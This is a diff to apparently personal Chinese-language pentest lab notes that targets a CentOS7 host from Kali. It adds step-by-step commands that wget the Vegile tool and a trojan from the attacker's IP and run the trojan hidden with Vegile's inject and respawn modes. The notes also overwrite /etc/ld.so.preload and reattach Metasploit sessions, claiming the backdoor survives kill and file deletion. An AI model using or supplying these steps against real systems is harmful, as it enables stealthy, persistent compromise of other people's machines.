@@ -1,6 +1,10 @@
 攻击机（kali）：10.211.55.6
 靶机（centos7）：10.211.55.7
 
+8080端口创建连接，上传Vegile；
+4444木马放到Vegile目录下，无文件执行；（Vegile执行木马后，删除木马及Vegile也会持续执行）
+
+
 攻击机（kali）：10.211.55.6
 恶意文件，让靶机执行
 ┌──(root💀kali-linux-2021-3)-[~]
@@ -84,9 +88,35 @@ msf6 exploit(multi/handler) > exploit -j
 后台监听，jobs查看
 
 
-#
-##
-###
+###8080攻击成功后，执行靶机；下载Vegile-master工具
+从8080攻击成功的会话
+wget http://10.211.55.6/Vegile-master.zip
+unzip Vegile-master.zip
+
+木马放到Vegile-master目录
+cd Vegile-master
+chmod +x Vegile
+此目录下载，4444的木马
+wget http://10.211.55.6/laohe_ghost
+chmod +x laohe_ghost
+
+隐藏执行
+./Vegile --i laohe_ghost
+执行中如果报错，No such file or directory
+执行
+echo "" > /etc/ld.so.preload
+
+./Vegile --u laohe_ghost
+无线复制会话，即使被kill，依然会再次执行
+
+
+####回到靶机查看4444端口的会话
+msf6 exploit(multi/handler) > sessions
+msf6 exploit(multi/handler) > sessions -i 1
+执行会话
+
+此时删除Vegile所有目录和木马，会话连接不会断
+
 
 
 
